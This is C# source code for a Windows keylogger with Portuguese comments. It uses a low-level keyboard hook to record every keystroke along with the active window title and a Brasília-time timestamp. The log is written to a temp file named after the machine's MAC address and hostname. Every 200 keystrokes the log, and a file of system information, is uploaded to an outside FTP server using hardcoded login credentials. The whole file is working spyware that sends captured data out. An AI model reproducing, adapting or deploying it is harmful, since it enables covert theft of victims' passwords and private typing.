using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net;
using keylogger;

namespace vrtx_keys {
    class KeyboardListener {
        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x0100;
        private static int WM_SYSKEYDOWN = 0x0104;
        private static int HC_ACTION = 0;
        private static int VK_SHIFT = 0x10;
        private static int VK_CAPITAL = 0x14;
        private static int VK_RMENU = 0xA5;

        public static LowLevelKeyboardProc llkProcedure = HookCallback;
        private static bool capsPressed = GetKeyState(VK_CAPITAL);
        private static bool shiftPressed = GetKeyState(VK_SHIFT);
        private static bool rAltPressed = GetKeyState(VK_RMENU);

        private static string FILEPATH = FileAccess(Path.GetTempPath());
        private static IntPtr PFGW;

        private static uint charCounter = 0;

        public static bool sysUpload = true; //Para fazer upload do arquivo de informações do sistema
        public static bool logUpload = false; //Para fazer upload do arquivo de log do teclado 

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        //Método responsável pelo acesso do arquivo de log
        private static string FileAccess(string path) {
            //Se o diretório passado não existir, criamos o mesmo
            if(!Directory.Exists(path)) {
                Directory.CreateDirectory(path);
            }

            //filepath é o caminho absoluto para o aquivo de log
            string logFilepath = path + @"\" + NetworkInteraction.GetMacAddress() + "_" + Dns.GetHostName() + ".log";
            string sysFilepath = path + @"\sys_data_capture.log";

            //Caso o arquivo não exista
            if(!File.Exists(logFilepath)) {
                //Criando o arquivo de log
                using(StreamWriter sw = File.CreateText(logFilepath)) { }
                //Criando o arquivo de informações do sistema
                NetworkInteraction.GetExtraInfo();
                //Fazendo o upload do arquivo de informações do sistema
            }

            NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", sysFilepath, NetworkInteraction.GetMacAddress(), sysUpload);

            return logFilepath;
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if(nCode >= HC_ACTION) {
                using(StreamWriter output = File.AppendText(FILEPATH)) {
                    IntPtr fgw = GetForegroundWindow();
                    StringBuilder title = new StringBuilder("", 256);

                    if(PFGW != fgw) {
                        // Brazil DateTime
                        DateTime utcDateTime = DateTime.UtcNow;
                        TimeZoneInfo brasiliaDateTimeInfo = TimeZoneInfo.FindSystemTimeZoneById("E. South America Standard Time");
                        DateTime brzDateTime = TimeZoneInfo.ConvertTimeFromUtc(utcDateTime, brasiliaDateTimeInfo);

                        // Window title
                        GetWindowText(fgw, title, 256);

                        Console.Out.Write("\n[{0}] - GMT-3: {1}\n", title.ToString(), brzDateTime.ToString());
                        output.Write("\n[{0}] - GMT-3: {1}\n", title.ToString(), brzDateTime.ToString());

                        // ForegroundWindow updated
                        PFGW = fgw;
                    }
                }

                int vkCode = Marshal.ReadInt32(lParam);

                if(wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN) {
                    if(charCounter == 200) {
                        charCounter = 0;
                        NetworkInteraction.FtpUploader("ftpupload.net", 21, "epiz_26313655", "1YMGe66Wlztz9", FILEPATH, NetworkInteraction.GetMacAddress(), logUpload);
                    }
                    else charCounter++;

                    if(vkCode == VK_CAPITAL)
                        capsPressed = !capsPressed;

                    writeChar(vkCode);
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        public static IntPtr SetHook(LowLevelKeyboardProc proc) {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }

        private static void writeChar(int vkCode) {
            using(StreamWriter output = File.AppendText(FILEPATH)) {
                switch(((Keys)vkCode).ToString()) {

                    case "None": // None - vkCode: 0
                        Console.Out.Write("");
                        output.Write("");
                        break;

                    case "Add": // NumPad
                        Console.Out.Write("+");
                        output.Write("+");
                        break;

                    case "Apps": // Application key
                        Console.Out.Write("[Apps]");
                        output.Write("[≣ Menu]");
                        break;

                    case "Back": // Backspace
                        Console.Out.Write("[Backspace]");
                        output.Write("[⟵ ]");
                        break;

                    case "BrowserHome": // Other shortcuts
                        Console.Out.Write("[BrowserHome]");
                        output.Write("[🏠]");
                        break;

                    case "BrowserSearch": // Other shortcuts
                        Console.Out.Write("[BrowserSearch]");
                        output.Write("[⌕]");
                        break;

                    case "Capital": // Caps Lock
                        Console.Out.Write("[Caps]");
                        // output.Write("[Caps Lock]");
                        break;

                    case "Clear": // NumPad
                        Console.Out.Write("[Clear(5)]");
                        break;

                    case "D1": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("!");
                            output.Write("!");
                        }
                        else {
                            Console.Out.Write("1");
                            output.Write("1");
                        }
                        break;
                    case "D2": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("@");
                            output.Write("@");
                        }
                        else {
                            Console.Out.Write("2");
                            output.Write("2");
                        }
                        break;
                    case "D3": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("#");
                            output.Write("#");
                        }
                        else {
                            Console.Out.Write("3");
                            output.Write("3");
                        }
                        break;
                    case "D4": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("$");
                            output.Write("$");
                        }
                        else {
                            Console.Out.Write("4");
                            output.Write("4");
                        }
                        break;
                    case "D5": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("%");
                            output.Write("%");
                        }
                        else {
                            Console.Out.Write("5");
                            output.Write("5");
                        }
                        break;
                    case "D6": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("¨");
                            output.Write("¨");
                        }
                        else {
                            Console.Out.Write("6");
                            output.Write("6");
                        }
                        break;
                    case "D7": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("&");
                            output.Write("&");
                        }
                        else {
                            Console.Out.Write("7");
                            output.Write("7");
                        }
                        break;
                    case "D8": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("*");
                            output.Write("*");
                        }
                        else {
                            Console.Out.Write("8");
                            output.Write("8");
                        }
                        break;
                    case "D9": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("(");
                            output.Write("(");
                        }
                        else {
                            Console.Out.Write("9");
                            output.Write("9");
                        }
                        break;
                    case "D0": // Numerico
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write(")");
                            output.Write(")");
                        }
                        else {
                            Console.Out.Write("0");
                            output.Write("0");
                        }
                        break;

                    case "Decimal": // NumPad
                        Console.Out.Write(",");
                        output.Write(",");
                        break;

                    case "Delete": // Control Pad
                        Console.Out.Write("[Delete]");
                        output.Write("[Delete]");
                        break;

                    case "Divide": //NumPad
                        Console.Out.Write("/");
                        output.Write("/");
                        break;

                    case "Down": // Arrow Pad
                        Console.Out.Write("[ADown]");
                        output.Write("[↓]");
                        break;

                    case "End": // Control Pad
                        Console.Out.Write("[End]");
                        output.Write("[End]");
                        break;

                    case "Escape":  // Function
                        Console.Out.Write("[Esc]");
                        output.Write("[Esc]");
                        break;

                    case "F1": // Function
                    case "F2": // Function
                    case "F3": // Function
                    case "F4": // Function
                    case "F5": // Function
                    case "F6": // Function
                    case "F7": // Function
                    case "F8": // Function
                    case "F9": // Function
                    case "F10": // Function
                    case "F11": // Function
                    case "F12": // Function
                        Console.Out.Write("[" + (Keys)vkCode + "]");
                        output.Write("[" + (Keys)vkCode + "]");
                        break;

                    case "Home": // Control Pad
                        Console.Out.Write("[Home]");
                        output.Write("[Home]");
                        break;

                    case "Insert": // Control Pad
                        Console.Out.Write("[Insert]");
                        output.Write("[Insert]");
                        break;

                    case "LaunchApplication1": // Other shortcuts
                        Console.Out.Write("[MyComp]");
                        output.Write("[💻]");
                        break;

                    case "LaunchMail": // Other shortcuts
                        Console.Out.Write("[LaunchMail]");
                        output.Write("[✉️]");
                        break;

                    case "LButton, OemClear": // Other shortcuts
                        Console.Out.Write("[BrightConec]");
                        output.Write("[-🔅] [+🔅] [🌐]");
                        break;

                    //tratar altgr
                    case "LButton, Oemtilde": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        rAltPressed = GetAsyncKeyState(VK_RMENU) < 0;
                        if(shiftPressed) {// & !rAltPressed) {
                            Console.Out.Write("?");
                            output.Write("?");
                        }
                        else if(rAltPressed & !shiftPressed) {
                            Console.Out.Write("°");
                            output.Write("°");
                        }
                        else {
                            Console.Out.Write("/");
                            output.Write("/");
                        }
                        break;

                    case "LControlKeyRMenu": // Typewriter
                        Console.Out.Write("[Alt Gr]");
                        // output.Write("[Alt Gr]");
                        break;

                    case "LControlKey": // Typewriter
                        Console.Out.Write("[LCtrl]");
                        // output.Write("[Ctrl]");
                        break;

                    case "Left": // Arrow Pad
                        Console.Out.Write("[ALeft]");
                        output.Write("[←]");
                        break;

                    case "LMenu": // Typewriter
                        Console.Out.Write("[Alt]");
                        // output.Write("[Alt]");
                        break;

                    case "LShiftKey": // Typewriter
                        Console.Out.Write("[LShift]");
                        // output.Write("[⇧Shift]");
                        break;

                    case "LWin": // System
                        Console.Out.Write("[LWin]");
                        output.Write("[⊞ Win]");
                        break;

                    case "MediaNextTrack": // Media shortcut
                        Console.Out.Write("[MNextTrack]");
                        output.Write("[⏭]");
                        break;

                    case "MediaPlayPause": // Media shortcut
                        Console.Out.Write("[MPlayTrack]");
                        output.Write("[⏯]");
                        break;

                    case "MediaPreviousTrack": // Media shortcut
                        Console.Out.Write("[MPrevTrack]");
                        output.Write("[⏮]");
                        break;

                    case "Multiply": // NumPad
                        Console.Out.Write("*");
                        output.Write("*");
                        break;

                    case "NumLock": // NumPad
                        Console.Out.Write("[NumLock]");
                        output.Write("[NumLock]");
                        break;

                    case "NumPad1": // NumPad
                    case "NumPad2": // NumPad
                    case "NumPad3": // NumPad
                    case "NumPad4": // NumPad
                    case "NumPad5": // NumPad
                    case "NumPad6": // NumPad
                    case "NumPad7": // NumPad
                    case "NumPad8": // NumPad
                    case "NumPad9": // NumPad
                    case "NumPad0": // NumPad
                        Console.Out.Write(((Keys)vkCode).ToString().Substring(6));
                        output.Write(((Keys)vkCode).ToString().Substring(6));
                        break;

                    case "Oem1": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed ^ capsPressed) {
                            Console.Out.Write("Ç");
                            output.Write("Ç");
                        }
                        else {
                            Console.Out.Write("ç");
                            output.Write("ç");
                        }
                        break;

                    case "Oem5": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        rAltPressed = GetAsyncKeyState(VK_RMENU) < 0;
                        if(shiftPressed & !rAltPressed) {
                            Console.Out.Write("}");
                            output.Write("}");
                        }
                        else if(rAltPressed & !shiftPressed) {
                            Console.Out.Write("º");
                            output.Write("º");
                        }
                        else {
                            Console.Out.Write("]");
                            output.Write("]");
                        }

                        break;

                    case "Oem6": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        rAltPressed = GetAsyncKeyState(VK_RMENU) < 0;
                        if(shiftPressed & !rAltPressed) {
                            Console.Out.Write("{");
                            output.Write("{");
                        }
                        else if(rAltPressed & !shiftPressed) {
                            Console.Out.Write("ª");
                            output.Write("ª");
                        }
                        else {
                            Console.Out.Write("[");
                            output.Write("[");
                        }
                        break;

                    case "Oem7": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("^");
                            output.Write("^");
                        }
                        else {
                            Console.Out.Write("~");
                            output.Write("~");
                        }
                        break;

                    case "OemBackslash": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("|");
                            output.Write("|");
                        }
                        else {
                            Console.Out.Write("\\");
                            output.Write("\\");
                        }
                        break;

                    case "Oemcomma": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("<");
                            output.Write("<");
                        }
                        else {
                            Console.Out.Write(",");
                            output.Write(",");
                        }
                        break;

                    case "OemMinus": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("_");
                            output.Write("_");
                        }
                        else {
                            Console.Out.Write("-");
                            output.Write("-");
                        }
                        break;

                    case "OemOpenBrackets": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("`");
                            output.Write("`");
                        }
                        else {
                            Console.Out.Write("´");
                            output.Write("´");
                        }
                        break;

                    case "OemPeriod": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write(">");
                            output.Write(">");
                        }
                        else {
                            Console.Out.Write(".");
                            output.Write(".");
                        }
                        break;

                    case "Oemplus": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        rAltPressed = GetAsyncKeyState(VK_RMENU) < 0;
                        if(shiftPressed & !rAltPressed) {
                            Console.Out.Write("+");
                            output.Write("+");
                        }
                        else if(rAltPressed & !shiftPressed) {
                            Console.Out.Write("§");
                            output.Write("§");
                        }
                        else {
                            Console.Out.Write("=");
                            output.Write("=");
                        }
                        break;

                    //tratar shift
                    case "OemQuestion": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write(":");
                            output.Write(":");
                        }
                        else {
                            Console.Out.Write(";");
                            output.Write(";");
                        }
                        break;

                    case "Oemtilde": // Typewriter
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed) {
                            Console.Out.Write("\"");
                            output.Write("\"");
                        }
                        else {
                            Console.Out.Write("'");
                            output.Write("'");
                        }
                        break;

                    case "Next": // PGDOWN // Control Pad
                        Console.Out.Write("[PageDown]");
                        output.Write("[PageDown]");
                        break;

                    case "PageUp": // Control Pad
                        Console.Out.Write("[PageUp]");
                        output.Write("[PageUp]");
                        break;

                    case "Pause": // Control Pad
                        Console.Out.Write("[PauseBreak]");
                        output.Write("[PauseBreak]");
                        break;

                    case "PrintScreen": // Control Pad
                        Console.Out.Write("[PrintScreen]");
                        output.Write("[PrintScreen]");
                        break;

                    case "RButton, Oemtilde": // NumPad
                        Console.Out.Write(".");
                        output.Write(".");
                        break;

                    case "RControlKey": // Typewriter
                        Console.Out.Write("[RCtrl]");
                        // output.Write("[Ctrl]");
                        break;

                    case "Return": // Typewriter
                        Console.Out.Write("\n");
                        output.Write("\n");
                        break;

                    case "Right": // Arrow Pad
                        Console.Out.Write("[ARight]");
                        output.Write("[→]");
                        break;

                    case "RMenu": // Typewriter
                        Console.Out.Write("[RAlt]");
                        // output.Write("[RAlt]");
                        break;


                    case "RShiftKey": // Typewriter
                        Console.Out.Write("[RShift]");
                        // output.Write("[⇧Shift]");
                        break;

                    case "RWin": // System
                        Console.Out.Write("[RWin]");
                        output.Write("[⊞ Win]");
                        break;

                    case "Scroll": // Control Pad
                        Console.Out.Write("[ScrollLock]");
                        output.Write("[ScrollLock]");
                        break;

                    case "Space": // Typewriter
                        Console.Out.Write(" ");
                        output.Write(" ");
                        break;

                    case "Subtract": // NumPad
                        Console.Out.Write("-");
                        output.Write("-");
                        break;

                    case "Tab": // Typewriter
                        Console.Out.Write("[Tab]");
                        output.Write("    ");
                        break;

                    case "Up": // Arrow Pad
                        Console.Out.Write("[AUp]");
                        output.Write("[↑]");
                        break;

                    case "VolumeDown": // Media shortcut
                        Console.Out.Write("[VolDown]");
                        output.Write("[🔉]");
                        break;

                    case "VolumeMute": // Media shortcut
                        Console.Out.Write("[VolMute]");
                        output.Write("[🔇]");
                        break;

                    case "VolumeUp": // Media shortcut
                        Console.Out.Write("[VolUp]");
                        output.Write("[🔊]");
                        break;

                    default:
                        shiftPressed = GetAsyncKeyState(VK_SHIFT) < 0;
                        if(shiftPressed ^ capsPressed) {
                            Console.Out.Write((Keys)vkCode);
                            output.Write((Keys)vkCode);
                        }
                        else {
                            Console.Out.Write(((Keys)vkCode).ToString().ToLower());
                            output.Write(((Keys)vkCode).ToString().ToLower());
                        }
                        break;
                }
            }
        }

        [DllImport("user32.dll")]
        private static extern bool GetKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String lpModuleName);

        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    }
}